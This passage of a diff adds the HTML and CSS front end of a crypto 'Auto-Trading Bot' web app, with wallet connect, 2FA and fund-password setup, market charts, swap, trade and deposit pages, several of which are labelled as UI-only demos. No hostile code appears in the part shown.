@@ -1,0 +1,1737 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Blockchain Auto-Trading Bot</title>
+    <meta name="theme-color" content="#0d0f14" />
+
+    <link rel="manifest" href='data:application/manifest+json,{
+    "name":"Blockchain Auto-Trading Bot",
+    "short_name":"Bot",
+    "start_url":"./",
+    "display":"standalone",
+    "background_color":"#0d0f14",
+    "theme_color":"#0d0f14",
+    "icons":[
+      {"src":"./app-logo.png","sizes":"192x192","type":"image/png"},
+      {"src":"./app-logo.png","sizes":"512x512","type":"image/png"}
+    ]
+  }' />
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://s3.tradingview.com/tv.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/otplib@12.0.1/otplib.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <style>
+        :root {
+            --bg: #0d0f14;
+            --panel: #11141b;
+            --panel-2: #0f1218;
+            --muted: #a0a7b4;
+            --brand: #1ea7fd;
+            --accent: #22c55e;
+            --danger: #ef4444;
+        }
+        html, body {
+            background: var(--bg);
+            color: #fff;
+            font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif;
+        }
+        .glass {
+            background: linear-gradient(180deg, rgba(255, 255, 255, .06), rgba(255, 255, 255, .02));
+            backdrop-filter: blur(10px);
+        }
+        .btn {
+            @apply px-4 py-3 rounded-xl font-semibold;
+            background: #1e293b;
+        }
+        .btn-primary {
+            background: var(--brand);
+        }
+        .btn-primary:active {
+            transform: translateY(1px);
+        }
+        .btn-ghost {
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, .08);
+        }
+        .tab-active {
+            color: var(--brand);
+        }
+        .hidden-page {
+            display: none;
+        }
+        .page {
+            min-height: calc(100dvh - 64px - 64px);
+        }
+        .safe-note {
+            font-size: .75rem;
+            color: var(--muted);
+        }
+        .qr-placeholder {
+            width: 128px;
+            height: 128px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #333;
+            color: #999;
+            border-radius: 8px;
+            font-size: 10px;
+        }
+        .token-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+<div id="modal" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden">
+    <div class="bg-[var(--panel)] p-6 rounded-2xl shadow-xl max-w-sm mx-auto">
+        <h3 id="modalTitle" class="text-xl font-bold mb-2"></h3>
+        <p id="modalMessage" class="text-[var(--muted)] mb-4"></p>
+        <button onclick="window.hideModal()" class="w-full btn-primary rounded-xl">OK</button>
+    </div>
+</div>
+
+<div id="securityModal" class="fixed inset-0 bg-black bg-opacity-70 hidden items-center justify-center z-50 p-4">
+  <div class="bg-gray-900 text-gray-100 rounded-xl w-full max-w-lg p-6 relative">
+    <button id="closeSecurityModal" class="absolute top-4 right-4 text-gray-400 hover:text-white font-bold text-lg" aria-label="Close security modal">
+      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+      </svg>
+    </button>
+    <h2 class="text-2xl font-bold mb-4">🔐 Security Setup</h2>
+    <div class="bg-gray-800 p-4 rounded-lg mb-4">
+      <p><strong>User ID:</strong> <span id="modalUserId"></span></p>
+      <p><strong>Username:</strong> <input type="text" id="modalUsername" readonly class="bg-gray-700 text-white rounded px-2 py-1 w-full mt-1"></p>
+    </div>
+    <label class="block font-semibold mb-1">Scan this QR Code in Google Authenticator:</label>
+    <div id="modalQrCode" class="mb-2"></div>
+    <div id="modalSecretKey" class="bg-gray-800 p-2 rounded mb-4"></div>
+    <label class="block font-semibold mb-1">Enter 2FA Code:</label>
+    <input type="number" id="modalCodeInput" placeholder="Enter 6-digit code" class="w-full mb-2 px-3 py-2 rounded bg-gray-800 text-white" aria-label="2FA Code Input">
+    <button id="verify2FABtn" class="w-full bg-blue-600 hover:bg-blue-700 py-2 rounded mb-2">Verify Code</button>
+    <div id="verifyResult" class="mb-4"></div>
+    <label class="block font-semibold mb-1">Set Fund Password:</label>
+    <div class="flex mb-4">
+      <input type="password" id="modalFundPassword" placeholder="Enter fund password" class="flex-grow px-3 py-2 rounded-l bg-gray-800 text-white" aria-label="Fund Password Input">
+      <button id="toggleFundPassword" class="bg-gray-700 px-3 rounded-r" aria-label="Toggle password visibility">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-white" viewBox="0 0 20 20" fill="currentColor">
+          <path d="M10 12a2 2 0 100-4 2 2 0 000 4z" />
+          <path fill-rule="evenodd" d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clip-rule="evenodd" />
+        </svg>
+      </button>
+    </div>
+    <button id="saveSecurityBtn" class="w-full bg-green-600 hover:bg-green-700 py-2 rounded">Save Security Settings</button>
+    <div id="saveResult" class="mt-2"></div>
+  </div>
+</div>
+
+<div id="searchSheet" class="fixed inset-0 hidden bg-black/60 z-40 flex items-end">
+    <div class="w-full bg-[var(--panel)] rounded-t-2xl p-4">
+        <div class="flex items-center justify-between mb-2">
+            <div class="font-semibold">Search coins</div>
+            <button class="text-sm" onclick="window.toggleSearch(false)">Close</button>
+        </div>
+        <input id="searchInput" class="w-full px-3 py-3 rounded-lg bg-[var(--panel-2)]" placeholder="Type a symbol or name" aria-label="Search coins" />
+        <div id="searchResults" class="mt-3 max-h-72 overflow-auto divide-y divide-white/5"></div>
+    </div>
+</div>
+
+<div id="walletModal" class="fixed inset-0 hidden bg-black/60 z-40 flex items-center justify-center">
+    <div class="w-[92%] max-w-md bg-[var(--panel)] rounded-2xl p-5">
+        <h3 class="font-semibold mb-2">Connected Wallet</h3>
+        <div class="text-xs text-[var(--muted)]">Address</div>
+        <div id="walletAddr" class="font-mono break-all">—</div>
+        <div class="mt-2 text-xs text-[var(--muted)]">User ID</div>
+        <div id="userIdDisplay" class="font-mono break-all">—</div>
+        <div class="mt-4 flex gap-2">
+            <button class="btn-ghost rounded-xl" onclick="window.closeWalletModal()">Close</button>
+        </div>
+    </div>
+</div>
+
+<div id="selectTokenModal" class="fixed inset-0 hidden bg-black/60 z-40 flex items-end">
+  <div class="w-full bg-[var(--panel)] rounded-t-2xl p-4">
+    <div class="flex items-center justify-between mb-4">
+        <div class="font-semibold">Select a token</div>
+        <button class="text-sm" onclick="window.closeTokenSelectModal()">Close</button>
+    </div>
+    <input type="text" id="tokenSearchInput" class="w-full px-3 py-3 rounded-lg bg-[var(--panel-2)]" placeholder="Search tokens..." aria-label="Search tokens" />
+    <div id="tokenList" class="mt-3 max-h-72 overflow-auto divide-y divide-white/5"></div>
+  </div>
+</div>
+
+<header class="h-16 flex items-center justify-between px-4 border-b border-white/5 bg-[var(--panel)]">
+    <div class="flex items-center gap-3">
+        <img alt="logo" class="w-8 h-8" src="app-logo.png" />
+        <div class="text-sm leading-tight">
+            <div class="font-bold">Blockchain Auto-Trading Bot</div>
+            <div id="netTag" class="text-[11px] text-[var(--muted)]">Disconnected</div>
+        </div>
+    </div>
+    <div class="flex items-center gap-2">
+        <button id="notificationsBtn" class="p-2 rounded-full hover:bg-white/5" aria-label="Notifications">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path>
+                <path d="M13.73 21a2 2 0 0 1-3.46 0"></path>
+            </svg>
+        </button>
+        <button id="transactionsBtn" class="p-2 rounded-full hover:bg-white/5" aria-label="Transactions">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+              <polyline points="7 10 12 15 17 10"></polyline>
+              <line x1="12" y1="15" x2="12" y2="3"></line>
+          </svg>
+        </button>
+        <button id="searchOpen" class="p-2 rounded-full hover:bg-white/5" aria-label="Search">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="11" cy="11" r="8"></circle>
+                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+            </svg>
+        </button>
+    </div>
+</header>
+
+<main class="flex-1 overflow-auto">
+    <section id="landing" class="page px-4 py-4 space-y-5">
+        <div class="rounded-2xl p-5 glass">
+            <img alt="Blockchain Auto-Trading Bot" class="w-full h-auto mb-4 rounded-lg" src="app-logo.png" />
+            <h1 class="text-2xl font-bold">Welcome</h1>
+            <p class="text-[var(--muted)]">Live market data, wallet connect, AI Trading Bot</p>
+            <div class="mt-4 grid grid-cols-2 gap-2">
+                <button id="connectWalletBtn" class="btn-primary rounded-xl">
+                    <div class="flex items-center justify-center gap-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M21 12V7H3v14h18v-5"></path>
+                            <line x1="16" y1="12" x2="21" y2="12"></line>
+                            <line x1="16" y1="16" x2="21" y2="16"></line>
+                            <line x1="12" y1="11" x2="12" y2="11"></line>
+                            <path d="M19 12h2a2 2 0 0 0 0-4h-3a2 2 0 0 1 0-4h4"></path>
+                        </svg>
+                        Connect Wallet
+                    </div>
+                </button>
+                <button id="getAppBtn" class="btn-ghost rounded-xl">GET APP</button>
+            </div>
+            <p class="safe-note mt-2">Blockchain Powered</p>
+        </div>
+        <div class="rounded-2xl p-5 bg-[var(--panel)]">
+            <div class="flex items-center justify-between mb-3">
+                <h2 class="font-semibold">Market Overview</h2>
+                <button id="refreshMarket" class="text-xs text-[var(--muted)]" aria-label="Refresh market data">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 inline" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M23 4v6h-6"></path>
+                        <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path>
+                    </svg>
+                    Refresh
+                </button>
+            </div>
+            <div id="marketList" class="divide-y divide-white/5"></div>
+        </div>
+    </section>
+
+    <section id="loading" class="page px-4 py-8 hidden-page">
+        <div class="flex flex-col items-center justify-center gap-4 mt-20">
+            <svg class="animate-spin h-10 w-10 text-[var(--brand)]" viewBox="0 0 24 24">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
+            </svg>
+            <div class="text-sm text-[var(--muted)]">Setting up your session...</div>
+        </div>
+    </section>
+    
+    <section id="loading-disconnect" class="page px-4 py-8 hidden-page">
+        <div class="flex flex-col items-center justify-center gap-4 mt-20">
+            <svg class="animate-spin h-10 w-10 text-[var(--danger)]" viewBox="0 0 24 24">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
+            </svg>
+            <div class="text-sm text-[var(--muted)]">Disconnecting...</div>
+        </div>
+    </section>
+
+    <section id="home" class="page px-4 py-4 hidden-page space-y-4">
+        <div class="rounded-2xl p-5 bg-[var(--panel)]">
+            <div class="flex items-center justify-between">
+                <div>
+                    <div class="text-xs text-[var(--muted)]">Total Portfolio</div>
+                    <div id="totalBalance" class="text-3xl font-bold">$0.00</div>
+                </div>
+                <div class="flex items-center gap-2">
+                    <button onclick="window.showPage('dfi')" class="p-2 rounded-full hover:bg-white/5" aria-label="DFI Wallet">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                        </svg>
+                    </button>
+                    <button onclick="window.showPage('settings')" class="p-2 rounded-full hover:bg-white/5" aria-label="Settings">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="12" r="3"></circle>
+                            <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2h-2a2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 6.22 18a1.65 1.65 0 0 0-1.82.33L4.34 18a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 2-2h.09a1.65 1.65 0 0 0 1.82-.33L6 8.34a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H12a2 2 0 0 1 2-2h2a2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1.82.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V12a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2z"></path>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+            <div class="mt-4 flex gap-2">
+                <button onclick="window.showPage('deposit'); window.startDepositFlow()" class="btn-ghost rounded-xl">
+                    <div class="flex items-center justify-center gap-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                            <polyline points="17 8 12 3 7 8"></polyline>
+                            <line x1="12" y1="3" x2="12" y2="15"></line>
+                        </svg>
+                        Deposit
+                    </div>
+                </button>
+                <button onclick="window.showPage('swap')" class="btn-ghost rounded-xl">
+                    <div class="flex items-center justify-center gap-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M11 5L4 12l7 7"></path>
+                            <path d="M18 5l7 7-7 7"></path>
+                        </svg>
+                        Swap
+                    </div>
+                </button>
+                <button onclick="window.showPage('send')" class="btn-ghost rounded-xl">
+                    <div class="flex items-center justify-center gap-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                            <polyline points="17 8 12 3 7 8"></polyline>
+                            <line x1="12" y1="3" x2="12" y2="15"></line>
+                        </svg>
+                        Send
+                    </div>
+                </button>
+            </div>
+        </div>
+        
+        <div class="rounded-2xl p-5 bg-[var(--panel)]">
+            <div class="text-xs text-[var(--muted)]">Account ID</div>
+            <div id="homeAccountId" class="text-sm break-all font-mono"></div>
+        </div>
+
+        <div class="rounded-2xl p-5 bg-[var(--panel)]">
+            <div class="flex items-center justify-between mb-3">
+                <h2 class="font-semibold">Performance (BTCUSD)</h2>
+                <span class="text-[var(--muted)] text-xs">TradingView</span>
+            </div>
+            <div id="tv_chart" style="height:360px;"></div>
+        </div>
+
+        <div class="rounded-2xl p-5 bg-[var(--panel)]">
+            <div class="flex items-center justify-between mb-3">
+                <h2 class="font-semibold">Top Movers (24h)</h2>
+                <button id="refreshMovers" class="text-xs text-[var(--muted)]" aria-label="Refresh top movers">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 inline" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M23 4v6h-6"></path>
+                        <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path>
+                    </svg>
+                    Refresh
+                </button>
+            </div>
+            <div id="moversList" class="divide-y divide-white/5"></div>
+        </div>
+    </section>
+
+    <section id="discover" class="page px-4 py-4 hidden-page space-y-4">
+        <div class="rounded-2xl p-5 bg-[var(--panel)]">
+            <div class="flex items-center justify-between mb-3">
+                <h2 class="font-semibold">Discover</h2>
+                <button id="searchOpenDiscover" class="btn-ghost rounded-lg text-xs" aria-label="Search">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 inline" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="11" cy="11" r="8"></circle>
+                        <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+                    </svg>
+                    Search
+                </button>
+            </div>
+            <div id="discoverFeed" class="space-y-3"></div>
+        </div>
+    </section>
+
+    <section id="dfi" class="page px-4 py-4 hidden-page space-y-4">
+      <div class="flex items-center gap-3">
+        <button onclick="window.showPage('home')" class="p-2 rounded-full hover:bg-white/5" aria-label="Back to home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
+            </svg>
+        </button>
+        <h2 class="text-xl font-bold">DFI Wallet</h2>
+      </div>
+      <div class="rounded-2xl p-5 bg-[var(--panel)]">
+          <div class="flex items-center justify-between">
+              <div>
+                  <div class="text-xs text-[var(--muted)]">Total Balance</div>
+                  <div class="text-3xl font-bold" id="dfiBalance">$0.00</div>
+              </div>
+              <div class="flex items-center gap-2">
+                  <span class="text-sm font-semibold text-[var(--accent)]" id="dfiFiatBalance"></span>
+                  <img src="https://assets.coingecko.com/coins/images/2972/small/dfi.png" class="w-8 h-8 rounded-full" />
+              </div>
+          </div>
+          <div class="mt-4 flex gap-2">
+            <button onclick="window.showModal('Receive DFI', 'This feature is a UI-only demo. Scan a QR Code to receive funds.')" class="btn-ghost rounded-xl">
+                <div class="flex items-center justify-center gap-2">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                        <polyline points="17 8 12 3 7 8"></polyline>
+                        <line x1="12" y1="3" x2="12" y2="15"></line>
+                    </svg>
+                    Receive
+                </div>
+            </button>
+            <button onclick="window.showModal('Send DFI', 'This feature is a UI-only demo. No real funds will be sent.')" class="btn-ghost rounded-xl">
+                <div class="flex items-center justify-center gap-2">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <line x1="12" y1="5" x2="12" y2="19"></line>
+                        <line x1="5" y1="12" x2="19" y2="12"></line>
+                    </svg>
+                    Send
+                </div>
+            </button>
+          </div>
+      </div>
+
+      <div class="rounded-2xl p-5 bg-[var(--panel)]">
+        <h3 class="font-semibold mb-3">DFI Price</h3>
+        <div id="dfiChart" style="height:250px;"></div>
+      </div>
+      
+      <div class="rounded-2xl p-5 bg-[var(--panel)]">
+        <h3 class="font-semibold mb-3">Transaction History</h3>
+        <div id="dfiTransactions" class="space-y-3">
+          <div class="text-sm text-[var(--muted)]">No transactions found.</div>
+        </div>
+      </div>
+    </section>
+
+    <section id="swap" class="page px-4 py-4 hidden-page space-y-4">
+      <div class="rounded-2xl p-5 bg-[var(--panel)]">
+          <div class="flex items-center justify-between mb-3">
+              <h2 class="font-semibold">Swap</h2>
+          </div>
+          <div class="space-y-4">
+              <div class="relative">
+                  <div class="flex items-center justify-between bg-[var(--panel-2)] p-4 rounded-xl">
+                      <input type="number" id="swapAmountInput" placeholder="0.0" class="bg-transparent text-white w-full text-2xl font-bold focus:outline-none" aria-label="Amount to swap"/>
+                      <button id="fromTokenBtn" class="flex items-center bg-gray-700 px-3 py-2 rounded-xl text-sm" aria-label="Select from token">
+                          <img id="fromTokenIcon" src="https://assets.coingecko.com/coins/images/279/small/ethereum.png?1595348880" class="token-icon" alt="From Token Icon"/>
+                          <span id="fromTokenSymbol">ETH</span>
+                          <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 ml-1" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                              <path d="M6 9l6 6 6-6"></path>
+                          </svg>
+                      </button>
+                  </div>
+                  <button id="swapDirectionBtn" class="absolute left-1/2 -translate-x-1/2 -translate-y-1/2 bg-[var(--panel)] p-2 rounded-full border border-gray-600" aria-label="Swap direction">
+                      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                          <line x1="12" y1="5" x2="12" y2="19"></line>
+                          <polyline points="19 12 12 19 5 12"></polyline>
+                      </svg>
+                  </button>
+              </div>
+              <div class="relative">
+                  <div class="flex items-center justify-between bg-[var(--panel-2)] p-4 rounded-xl">
+                      <input type="number" id="swapReceiveInput" placeholder="0.0" class="bg-transparent text-white w-full text-2xl font-bold focus:outline-none" aria-label="Amount to receive"/>
+                      <button id="toTokenBtn" class="flex items-center bg-gray-700 px-3 py-2 rounded-xl text-sm" aria-label="Select to token">
+                          <img id="toTokenIcon" src="https://assets.coingecko.com/coins/images/1/small/bitcoin.png?1547033579" class="token-icon" alt="To Token Icon"/>
+                          <span id="toTokenSymbol">BTC</span>
+                          <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 ml-1" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                              <path d="M6 9l6 6 6-6"></path>
+                          </svg>
+                      </button>
+                  </div>
+              </div>
+          </div>
+          <button id="executeSwapBtn" class="w-full btn-primary rounded-xl mt-4">Swap</button>
+          <p id="swapStatus" class="safe-note text-center mt-2"></p>
+      </div>
+    </section>
+
+    <section id="trade" class="page px-4 py-4 hidden-page space-y-4">
+        <div class="rounded-2xl p-5 bg-[var(--panel)]">
+            <div class="flex items-center justify-between">
+                <h2 class="font-semibold">Trade</h2>
+                <button onclick="window.showModal('Coming Soon', 'Earnings screen is a UI-only demo.')" class="btn-ghost rounded-lg text-xs">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 inline" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                        <polyline points="14 2 14 8 20 8"></polyline>
+                        <line x1="16" y1="13" x2="8" y2="13"></line>
+                        <line x1="16" y1="17" x2="8" y2="17"></line>
+                        <polyline points="10 9 9 9 8 9"></polyline>
+                    </svg>
+                    View Earnings
+                </button>
+            </div>
+            <div id="tradeChart" style="height:360px;"></div>
+            <div class="mt-4 grid gap-4">
+                <div class="flex flex-col gap-2">
+                    <label for="tradeAssetSelect" class="text-sm text-[var(--muted)]">Select Asset:</label>
+                    <select id="tradeAssetSelect" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors"></select>
+                </div>
+                <div class="flex flex-col gap-2">
+                    <label for="tradeDuration" class="text-sm text-[var(--muted)]">Trade Duration (months):</label>
+                    <select id="tradeDuration" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
+                        <option value="1">1 month</option>
+                        <option value="2">2 months</option>
+                        <option value="3">3 months</option>
+                        <option value="4">4 months</option>
+                        <option value="5">5 months</option>
+                        <option value="6">6 months</option>
+                        <option value="7">7 months</option>
+                        <option value="8">8 months</option>
+                        <option value="9">9 months</option>
+                        <option value="10">10 months</option>
+                        <option value="11">11 months</option>
+                        <option value="12">12 months</option>
+                    </select>
+                </div>
+                <div class="flex flex-col gap-2">
+                    <label for="tradeAmount" class="text-sm text-[var(--muted)]">Investment Amount ($):</label>
+                    <input type="number" id="tradeAmount" placeholder="Enter investment amount" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
+                </div>
+                <button id="startTradeBtn" class="btn-primary rounded-xl">Place Trade</button>
+                <button onclick="window.showPage('transfer')" class="btn-ghost rounded-xl">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 inline" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="17 1 21 5 17 9"></polyline>
+                        <path d="M3 11v-4a4 4 0 0 1 4-4h14"></path>
+                        <polyline points="7 23 3 19 7 15"></polyline>
+                        <path d="M17 13v4a4 4 0 0 1-4 4H3"></path>
+                    </svg>
+                    Transfer Funds
+                </button>
+            </div>
+            
+            <div id="tradeInfo" class="mt-6 rounded-xl p-4 bg-[var(--panel-2)]">
+                <div class="flex justify-between items-center text-sm">
+                    <span class="text-[var(--muted)]">Trade Account Balance:</span>
+                    <span id="tradeBalance" class="font-semibold">$0.00</span>
+                </div>
+                <div class="flex justify-between items-center text-sm mt-2">
+                    <span class="text-[var(--muted)]">Total Earnings:</span>
+                    <span id="tradeEarnings" class="font-semibold">$0.00</span>
+                </div>
+            </div>
+            <p class="safe-note mt-4">This is a non-custodial demo UI. No real orders are placed.</p>
+        </div>
+    </section>
+
+    <section id="memes" class="page px-4 py-4 hidden-page space-y-4">
+        <div class="rounded-2xl p-5 bg-[var(--panel)]">
+            <h2 class="font-semibold mb-3">Trending (CoinGecko)</h2>
+            <div id="memeList" class="space-y-3"></div>
+        </div>
+    </section>
+
+    <section id="settings" class="page px-4 py-4 hidden-page space-y-4">
+        <div class="rounded-2xl p-5 bg-[var(--panel)]">
+            <h2 class="font-semibold mb-3">Account Settings</h2>
+            
+            <div class="text-sm text-[var(--muted)]">Wallet Address</div>
+            <div id="accountWalletAddress" class="font-mono text-sm break-all">—</div>
+            
+            <div class="mt-2 text-sm text-[var(--muted)]">Wallet Balance</div>
+            <div id="accountWalletBalance" class="font-mono text-sm break-all">0 ETH</div>
+
+            <div class="mt-4 text-sm text-[var(--muted)]">Account ID</div>
+            <div id="accountId" class="font-mono text-sm break-all">—</div>
+
+            <div class="mt-4 flex flex-col gap-2">
+                <button onclick="window.openWalletModal()" class="btn-ghost rounded-xl">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 inline" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M19 12H5"></path>
+                        <polyline points="12 5 5 12 12 19"></polyline>
+                    </svg>
+                    Connected Wallet
+                </button>
+                <button id="disconnectBtn" class="btn-ghost rounded-xl text-[var(--danger)] border border-[var(--danger)]">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 inline" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M16 17l5-5-5-5"></path>
+                        <path d="M19 12H2"></path>
+                        <path d="M12 20h9a2 2 0 002-2V6a2 2 0 00-2-2h-9"></path>
+                    </svg>
+                    Disconnect
+                </button>
+                <button id="securityBtn" class="btn-ghost rounded-xl">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 inline" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M12 2a10 10 0 00-10 10 10 10 0 0010 10 10 10 0 0010-10A10 10 0 0012 2z"></path>
+                        <path d="M8 14l4-4 4 4"></path>
+                        <path d="M12 10v6"></path>
+                    </svg>
+                    Security
+                </button>
+            </div>
+        </div>
+    </section>
+
+    <section id="deposit" class="page px-4 py-4 hidden-page space-y-4">
+        <div id="deposit-step-1" class="space-y-4">
+            <div class="flex items-center gap-3">
+                <button onclick="window.showPage('home')" class="p-2 rounded-full hover:bg-white/5" aria-label="Back to home">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
+                    </svg>
+                </button>
+                <h2 class="text-xl font-bold">Deposit</h2>
+            </div>
